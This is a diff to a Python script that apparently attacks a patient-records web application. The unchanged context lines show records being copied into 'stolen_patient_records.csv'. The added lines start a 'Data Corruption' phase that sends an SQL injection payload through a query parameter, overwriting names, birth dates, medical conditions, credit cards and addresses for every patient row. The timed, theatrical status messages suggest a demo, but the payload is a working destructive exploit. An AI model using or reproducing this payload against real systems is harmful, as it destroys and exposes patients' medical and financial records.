@@ -48,13 +48,32 @@ if response.status_code == 200:
         writer.writerows(stolen_data)
 
     print(f"Successfully copied {len(stolen_data)} patient records! 💾")
+    time.sleep(1)
     print("\nSECURITY BREACH COMPLETE")
 
+    time.sleep(1)
+    print("\nPhase 2: Starting Data Corruption...")
+    time.sleep(2)
+
+    # !!!!!!!!!
+    update_payload = "'; UPDATE patients SET name='DATA_CORRUPTED', dob='DATA_CORRUPTED', condition='DATA_CORRUPTED', credit_card='DATA_CORRUPTED', address='DATA_CORRUPTED' WHERE id > 0; --"
+
+    response2 = requests.get(url, params={'q': update_payload})
+
+    if response2.status_code == 200:
+        print("Data Manipulation Successful! ✅ ")
+    else:
+        print("Update failed.")
+    
+    time.sleep(2)
     print("\n=== STOLEN DATA (SAMPLE - just a few): ===")
+    time.sleep(0.5)
     for record in stolen_data[:3]:
         print(record)
+        time.sleep(0.5)
     for i in range(4):
         print(".")
+        time.sleep(0.2)
     print("File saved: stolen_patient_records.csv")
 
 else:
